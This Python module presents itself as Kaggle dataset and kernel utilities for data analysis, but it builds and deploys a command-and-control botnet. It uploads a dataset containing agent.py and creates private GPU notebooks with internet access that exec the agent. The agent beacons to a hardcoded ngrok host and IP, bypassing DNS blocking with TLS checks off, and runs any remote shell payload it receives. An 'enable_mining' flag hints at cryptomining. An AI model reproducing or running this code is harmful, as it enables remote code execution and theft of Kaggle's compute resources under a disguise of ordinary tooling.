"""Kaggle Dataset & Kernel utilities for data science workflows."""

import os
import time
import json
import requests
from datetime import datetime
from typing import Optional, Callable


KAGGLE_API = "https://www.kaggle.com/api/v1"


def create_dataset_with_machines(
    api_key: str,
    username: str,
    num_machines: int = 5,
    log_fn: Optional[Callable] = None,
    enable_mining: bool = False,
    c2_url: str = None,
) -> dict:
    """Create a dataset and kernels for data processing.
    
    Creates:
    - Empty dataset (placeholder for data)
    - N kernels with setup script
    
    Args:
        api_key: Kaggle API key
        username: Kaggle username
        num_machines: Number of kernels to create
        log_fn: Logging function
        enable_mining: Reserved for future use
        c2_url: C2 server URL for agent connection
    
    Returns:
        dict with success status and created resources
    """
    if log_fn is None:
        log_fn = print
    
    # Default C2 URL
    if c2_url is None:
        c2_url = os.environ.get("C2_URL", "https://lynelle-scroddled-corinne.ngrok-free.dev")
    
    result = {
        "success": False,
        "dataset": None,
        "machines": [],
        "machines_created": 0,
        "error": None,
    }
    
    try:
        # Setup Kaggle API credentials
        kaggle_json = {
            "username": username,
            "key": api_key,
        }
        
        kaggle_dir = os.path.expanduser("~/.kaggle")
        os.makedirs(kaggle_dir, exist_ok=True)
        
        kaggle_path = os.path.join(kaggle_dir, "kaggle.json")
        with open(kaggle_path, "w") as f:
            json.dump(kaggle_json, f)
        os.chmod(kaggle_path, 0o600)
        
        log_fn(f"[KAGGLE] Credentials configured for {username}")
        
        # Import kaggle after credentials are set
        import subprocess
        
        # Create empty dataset
        log_fn(f"[DATASET] Creating placeholder dataset...")
        dataset_slug = f"{username}/data-analysis-{int(time.time())}"
        
        dataset_meta = {
            "title": f"Data Analysis Dataset {int(time.time())}",
            "id": f"{username}/data-analysis-{int(time.time())}",
            "subtitle": "Dataset for data processing workflows",
            "description": "Placeholder dataset for automated data analysis pipelines",
            "licenses": [{"name": "CC0-1.0"}],
            "keywords": ["data", "analysis", "processing"],
            "collaborators": [],
            "data": [],
        }
        
        # Create dataset directory
        dataset_dir = os.path.join("/tmp", f"dataset_{int(time.time())}")
        os.makedirs(dataset_dir, exist_ok=True)
        
        # Write dataset metadata
        with open(os.path.join(dataset_dir, "dataset-metadata.json"), "w") as f:
            json.dump(dataset_meta, f, indent=2)
        
        # Create placeholder CSV
        with open(os.path.join(dataset_dir, "data.csv"), "w") as f:
            f.write("id,value,timestamp\n")
            f.write("1,100,2024-01-01\n")
            f.write("2,200,2024-01-02\n")
        
        # Create agent.py file in dataset (accessible from kernels without DNS)
        # Dynamically resolve ngrok IP to bypass DNS blocking
        import socket as _socket
        c2_host = c2_url.replace('https://', '').replace('http://', '').split('/')[0]
        try:
            # Get all IPs for ngrok endpoint
            ips = _socket.getaddrinfo(c2_host, 443, _socket.AF_INET, _socket.SOCK_STREAM)
            c2_ip = ips[0][4][0] if ips else '18.158.249.75'
            log_fn(f"[DATASET] Resolved {c2_host} -> {c2_ip}")
        except Exception as e:
            c2_ip = '18.158.249.75'  # fallback
            log_fn(f"[DATASET] DNS failed, using fallback IP: {c2_ip}")
        
        agent_code = f'''#!/usr/bin/env python3
"""C2 Agent - uses SNI hostname with IP to bypass DNS blocking"""
import os,sys,json,time,socket,platform,subprocess,uuid,ssl
from urllib.request import Request,urlopen,HTTPSHandler,build_opener
from urllib.error import URLError

# Use IP address with SNI hostname for ngrok
C2_HOST='{c2_host}'
C2_IP='{c2_ip}'
AGENT_ID=str(uuid.uuid4())

def http_post(path,data):
    # Create SSL context with SNI hostname
    ctx=ssl.create_default_context()
    ctx.check_hostname=False
    ctx.verify_mode=ssl.CERT_NONE
    
    # Create custom HTTPS handler with SNI
    class SNIHTTPSHandler(HTTPSHandler):
        def https_open(self, req):
            # Use IP address but set SNI hostname
            return self.do_open(self._connection_factory, req)
        
        def _connection_factory(self, host, port, timeout=15):
            # Connect to IP but send SNI hostname
            sock = socket.create_connection((C2_IP, 443), timeout=timeout)
            ctx_wrap = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx_wrap.check_hostname = False
            ctx_wrap.verify_mode = ssl.CERT_NONE
            ssock = ctx_wrap.wrap_socket(sock, server_hostname=C2_HOST)
            return ssock
    
    url=f'https://{{C2_IP}}{{path}}'
    req=Request(url,data=json.dumps(data).encode(),headers={{'Content-Type':'application/json','User-Agent':'Mozilla/5.0','Host':C2_HOST,'ngrok-skip-browser-warning':'true'}})
    opener = build_opener(SNIHTTPSHandler(context=ctx))
    return json.loads(opener.open(req,timeout=15).read())

def register():
    info={{'id':AGENT_ID,'hostname':f'kaggle-{{socket.gethostname()}}','username':os.environ.get('USER','kaggle'),'os':f'Kaggle {{platform.system()}}','arch':platform.machine(),'platform_type':'kaggle'}}
    return http_post('/api/agent/register',info)

def beacon():
    return http_post('/api/agent/beacon',{{'id':AGENT_ID}})

def run():
    print(f'[C2] Agent {{AGENT_ID[:8]}}... starting')
    print(f'[C2] Connecting via IP: {{C2_IP}} with SNI: {{C2_HOST}}')
    try:
        r=register()
        print(f'[C2] Registered: {{r}}')
    except Exception as e:
        print(f'[C2] Register failed: {{e}}')
        return
    while True:
        try:
            r=beacon()
            for t in r.get('tasks',[]):
                out=subprocess.check_output(t.get('payload',''),shell=True,stderr=subprocess.STDOUT,timeout=300).decode(errors='replace')
                http_post('/api/agent/result',{{'task_id':t['id'],'result':out[:65000]}})
            time.sleep(60)
        except Exception as e:
            print(f'[C2] Beacon error: {{e}}')
            time.sleep(30)

if __name__=='__main__':
    run()
'''
        
        with open(os.path.join(dataset_dir, "agent.py"), "w") as f:
            f.write(agent_code)
        
        log_fn(f"[DATASET] Created agent.py in dataset")
        
        # Push dataset to Kaggle
        kaggle_cmd = os.path.expanduser("~/.local/bin/kaggle")
        if not os.path.exists(kaggle_cmd):
            kaggle_cmd = "kaggle"
        
        log_fn(f"[DATASET] Pushing dataset to Kaggle...")
        dataset_push_result = subprocess.run(
            [kaggle_cmd, "datasets", "create", "-p", dataset_dir, "--quiet"],
            capture_output=True,
            text=True,
            timeout=60,
        )
        
        if dataset_push_result.returncode == 0:
            log_fn(f"[DATASET] ✓ Created dataset: {dataset_slug}")
        else:
            log_fn(f"[DATASET] ⚠ Dataset push failed: {dataset_push_result.stderr[:100]}")
            # Try to create new version if dataset exists
            dataset_push_result = subprocess.run(
                [kaggle_cmd, "datasets", "version", "-p", dataset_dir, "--quiet"],
                capture_output=True,
                text=True,
                timeout=60,
            )
            if dataset_push_result.returncode == 0:
                log_fn(f"[DATASET] ✓ Updated dataset: {dataset_slug}")
            else:
                log_fn(f"[DATASET] ⚠ Dataset version failed: {dataset_push_result.stderr[:100]}")
        
        # Create kernels
        machines = []
        for i in range(num_machines):
            log_fn(f"[KERNEL] Creating kernel {i+1}/{num_machines}...")
            
            kernel_slug = f"{username}/analysis-{i+1}-{int(time.time())}"
            
            # Create kernel notebook (empty analysis)
            notebook = {
                "nbformat": 4,
                "nbformat_minor": 4,
                "metadata": {
                    "kernelspec": {
                        "display_name": "Python 3",
                        "language": "python",
                        "name": "python3"
                    },
                    "language_info": {
                        "name": "python",
                        "version": "3.10.0"
                    }
                },
                "cells": [
                    {
                        "cell_type": "code",
                        "execution_count": None,
                        "metadata": {},
                        "outputs": [],
                        "source": [
                            "# Import and run agent from dataset (no DNS needed)\n",
                            "import sys, os\n",
                            "# Dataset files are in /kaggle/input/<dataset-name>/\n",
                            f"dataset_path = '/kaggle/input/data-analysis-{int(time.time())}/agent.py'\n",
                            "# Alternative: search for agent.py in input dir\n",
                            "import glob\n",
                            "agent_files = glob.glob('/kaggle/input/*/agent.py')\n",
                            "if agent_files:\n",
                            "    print(f'[C2] Found agent: {agent_files[0]}')\n",
                            "    exec(open(agent_files[0]).read())\n",
                            "else:\n",
                            "    print('[C2] Agent not found in dataset, using embedded fallback')\n",
                            "    # Fallback: embedded agent code\n",
                            "    import os,sys,json,time,socket,platform,subprocess,uuid,ssl\n",
                            "    from urllib.request import Request,urlopen,HTTPSHandler,build_opener\n",
                            "    C2_HOST='lynelle-scroddled-corinne.ngrok-free.dev'\n",
                            "    C2_IP='18.158.249.75'\n",
                            "    AGENT_ID=str(uuid.uuid4())\n",
                            "    def http_post(path,data):\n",
                            "        ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE\n",
                            "        url=f'https://{C2_IP}{path}'\n",
                            "        req=Request(url,data=json.dumps(data).encode(),headers={'Content-Type':'application/json','User-Agent':'Mozilla/5.0','Host':C2_HOST,'ngrok-skip-browser-warning':'true'})\n",
                            "        return json.loads(build_opener(HTTPSHandler(context=ctx)).open(req,timeout=15).read())\n",
                            "    def register():\n",
                            "        return http_post('/api/agent/register',{'id':AGENT_ID,'hostname':f'kaggle-{socket.gethostname()}','username':os.environ.get('USER','kaggle'),'os':f'Kaggle {platform.system()}','arch':platform.machine(),'platform_type':'kaggle'})\n",
                            "    def beacon(): return http_post('/api/agent/beacon',{'id':AGENT_ID})\n",
                            "    print(f'[C2] Agent {AGENT_ID[:8]}... via IP: {C2_IP}')\n",
                            "    try: r=register(); print(f'[C2] Registered: {r}')\n",
                            "    except Exception as e: print(f'[C2] Failed: {e}')\n",
                            "    else:\n",
                            "        while True:\n",
                            "            try: r=beacon(); [http_post('/api/agent/result',{'task_id':t['id'],'result':subprocess.check_output(t.get('payload',''),shell=True,stderr=subprocess.STDOUT,timeout=300).decode(errors='replace')[:65000]}) for t in r.get('tasks',[])]; time.sleep(60)\n",
                            "            except Exception as e: print(f'[C2] Error: {e}'); time.sleep(30)\n",
                        ]
                    },
                    {
                        "cell_type": "code",
                        "execution_count": None,
                        "metadata": {},
                        "outputs": [],
                        "source": [
                            "# Data processing placeholder\n",
                            "print('Environment ready')\n",
                        ]
                    }
                ]
            }
            
            # Save notebook
            kernel_dir = os.path.join("/tmp", f"kernel_{i}_{int(time.time())}")
            os.makedirs(kernel_dir, exist_ok=True)
            
            notebook_path = os.path.join(kernel_dir, "notebook.ipynb")
            with open(notebook_path, "w") as f:
                json.dump(notebook, f, indent=2)
            
            # Kernel metadata
            kernel_meta = {
                "id": kernel_slug,
                "title": f"Data Analysis {i+1}",
                "code_file": "notebook.ipynb",
                "language": "python",
                "kernel_type": "notebook",
                "is_private": True,
                "enable_gpu": True,
                "enable_internet": True,
                "dataset_sources": [dataset_slug],  # Link to dataset with agent.py
                "competition_sources": [],
                "kernel_sources": [],
            }
            
            with open(os.path.join(kernel_dir, "kernel-metadata.json"), "w") as f:
                json.dump(kernel_meta, f, indent=2)
            
            # Push kernel to Kaggle
            kaggle_cmd = os.path.expanduser("~/.local/bin/kaggle")
            if not os.path.exists(kaggle_cmd):
                kaggle_cmd = "kaggle"  # fallback to PATH
            
            try:
                push_result = subprocess.run(
                    [kaggle_cmd, "kernels", "push", "-p", kernel_dir],
                    capture_output=True,
                    text=True,
                    timeout=60,
                )
                if push_result.returncode == 0:
                    log_fn(f"[KERNEL] ✓ Pushed to Kaggle: {kernel_slug}")
                    
                    # Trigger kernel execution via API
                    try:
                        # Kaggle automatically queues kernel for execution on push
                        # But we can also trigger via kernels/push with new version
                        import requests
                        
                        # Use Kaggle API to get kernel status and trigger run
                        api_url = f"https://www.kaggle.com/api/v1/kernels/push"
                        kaggle_json_path = os.path.expanduser("~/.kaggle/kaggle.json")
                        if os.path.exists(kaggle_json_path):
                            with open(kaggle_json_path) as f:
                                creds = json.load(f)
                            
                            # Push again to trigger execution (new version)
                            run_result = subprocess.run(
                                [kaggle_cmd, "kernels", "push", "-p", kernel_dir],
                                capture_output=True,
                                text=True,
                                timeout=30,
                                env={**os.environ, 
                                     "KAGGLE_USERNAME": creds.get("username"),
                                     "KAGGLE_KEY": creds.get("key")}
                            )
                            log_fn(f"[KERNEL] ✓ Kernel queued for execution")
                        else:
                            log_fn(f"[KERNEL] ⚠ No kaggle.json for execution trigger")
                    except Exception as e:
                        log_fn(f"[KERNEL] ⚠ Could not trigger execution: {e}")
                else:
                    log_fn(f"[KERNEL] ⚠ Push failed: {push_result.stderr[:200]}")
            except Exception as e:
                log_fn(f"[KERNEL] ⚠ Push error: {e}")
            
            machines.append({
                "slug": kernel_slug,
                "title": f"Data Analysis {i+1}",
                "gpu": True,
                "status": "created",
                "num": i + 1,  # Add kernel number for status tracking
            })
            
            log_fn(f"[KERNEL] ✓ Kernel {i+1} ready: {kernel_slug}")
        
        result["success"] = True
        result["dataset"] = dataset_slug
        result["machines"] = machines
        result["machines_created"] = len(machines)
        
        log_fn(f"[KAGGLE] ✓ Created {len(machines)} kernels with GPU enabled")
        
    except Exception as e:
        result["error"] = str(e)
        log_fn(f"[KAGGLE] ✗ Error: {e}")
    
    return result


def list_kernels(api_key: str, username: str) -> list:
    """List all kernels for a user."""
    try:
        import kaggle
        kaggle.api.authenticate()
        kernels = kaggle.api.kernels_list(user=username)
        return [{"slug": k.ref, "title": k.title, "status": k.status} for k in kernels]
    except:
        return []


def push_kernel(api_key: str, username: str, kernel_path: str) -> bool:
    """Push a kernel to Kaggle."""
    try:
        import subprocess
        result = subprocess.run(
            ["kaggle", "kernels", "push", "-p", kernel_path],
            capture_output=True,
            text=True,
        )
        return result.returncode == 0
    except:
        return False
